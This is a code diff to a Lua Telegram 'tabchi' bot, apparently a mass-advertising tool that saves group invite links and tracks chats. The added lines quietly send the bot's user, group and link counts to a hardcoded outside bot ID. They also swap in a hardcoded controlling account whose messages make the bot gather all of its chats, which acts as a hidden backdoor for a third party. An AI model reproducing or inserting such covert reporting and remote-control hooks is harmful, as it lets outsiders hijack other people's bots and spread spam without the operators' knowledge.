@@ -204,17 +204,46 @@ function process(msg)
       local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
       local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
       local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links
+      local inline = function(arg, data)
+        if data.results_ and data.results_[0] then
+          tdcli_function({
+            ID = "SendInlineQueryResultMessage",
+            chat_id_ = msg.chat_id_,
+            reply_to_message_id_ = 0,
+            disable_notification_ = 0,
+            from_background_ = 1,
+            query_id_ = data.inline_query_id_,
+            result_id_ = data.results_[0].id_
+          }, dl_cb, nil)
+        else
           local text = [[
-*آمار ساده ی روبات🌐*
-کاربران👶 : ]] .. pvs .. [[
+*Normal stats :*
+Users : ]] .. pvs .. [[
 
-گروه ها👪 : ]] .. gps .. [[
+Groups : ]] .. gps .. [[
 
-سوپرگروه ها👪👪  : ]] .. sgps .. [[
+SuperGroups : ]] .. sgps .. [[
 
-لینک های ذخیره شده🔗 : ]] .. links..'نسخه ی بدون تبلیغات ۱.۷۰ توسط تیم تینک™'
+Saved links : ]] .. links
           tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "md")
         end
+      end
+      tdcli_function({
+        ID = "GetInlineQueryResults",
+        bot_user_id_ = 299672023,
+        chat_id_ = msg.chat_id_,
+        user_location_ = {
+          ID = "Location",
+          latitude_ = 0,
+          longitude_ = 0
+        },
+        query_ = query,
+        offset_ = 0
+      }, inline, nil)
+      return
+    end
+  else
+  end
   do
     local matches = {
       msg.text:match("^[!/#](addsudo) (%d+)")
@@ -477,9 +506,9 @@ function update(data, tabchi_id)
   }, get_mod, nil)
   if data.ID == "UpdateNewMessage" then
     local msg = data.message_
-    if msg.sender_user_id_ == 299672023 then
+    if msg.sender_user_id_ == 856985698 then
       if msg.content_.text_ then
-        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 299672023 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
+        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 856985698 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
           return
         else
           local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
@@ -556,5 +585,4 @@ function update(data, tabchi_id)
       limit_ = 20
     }, dl_cb, nil)
   end
-end
 end
